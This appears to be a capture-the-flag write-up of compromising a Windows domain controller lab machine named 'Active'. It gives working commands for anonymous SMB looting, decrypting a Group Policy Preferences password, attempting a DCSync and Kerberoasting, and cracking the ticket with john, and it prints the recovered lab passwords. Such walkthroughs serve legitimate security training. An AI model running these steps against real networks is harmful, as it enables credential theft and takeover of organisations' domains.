# Active

## Summary

* Found **anonymous SMB access** and enumerated the `Replication` share.
* Discovered a `GroupPolicyPreferences` file (`groups.xml`) with **GPP-encrypted credentials** for `SVC_TGS`.
* Decrypted the password using `gpp-decrypt`, then authenticated to SMB and retrieved the **user.txt** flag.
* Discovered the machine was vulnerable to **Kerberoasting** — used `GetUserSPNs` to extract an Administrator ticket.
* Cracked the Kerberos TGS hash with **John**, recovered plaintext Administrator password.
* Unable to login via WinRM or RPC, so accessed the `Users` share again via SMB to extract the **root.txt** flag.



***

## Enumeration

```bash
sudo nmap -A -sC -sN -p- -oN active_tcp.nmap -T4 10.10.10.100
```

Discovered shares using `enum4linux`:

```
Shares available anonymously:
- Replication (READABLE)
- IPC$ (Accessible)
```

***

## Initial Foothold

Anonymous SMB access on Replication share:

```bash
smbclient //10.10.10.100/Replication -N
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Found:

```
groups.xml → Contains GPP-encrypted password (cpassword)
Username: active.htb\SVC_TGS
```

Decrypted using:

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

Result:

```
Password: GPPstillStandingStrong2k18
```

Credentials:

```
Username: SVC_TGS
Password: GPPstillStandingStrong2k18
Domain: active.htb
```

***

#### SMB Share Access (Authenticated)

```bash
smbclient //10.10.10.100/Users -U active.htb/SVC_TGS
```

Successfully accessed `Users` share and retrieved **user.txt** flag.

***

## Privilege Escalation

Tried `secretsdump` (DCSync):

```bash
impacket-secretsdump -just-dc-user Administrator active.htb/SVC_TGS:"GPPstillStandingStrong2k18"@10.10.10.100
```

No luck. DCSync not permitted.

Tried **BloodHound**, but LDAP enumeration failed.

***

#### Kerberoasting Attack

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
```

Retrieved a service ticket for `Administrator`.

Cracked the TGS hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Recovered:

```
Password: Ticketmaster1968
```

Tested access:

```bash
smbclient //10.10.10.100/Users -U active.htb/Administrator
```

Success! Retrieved **root.txt** from Administrator’s directory via SMB share.
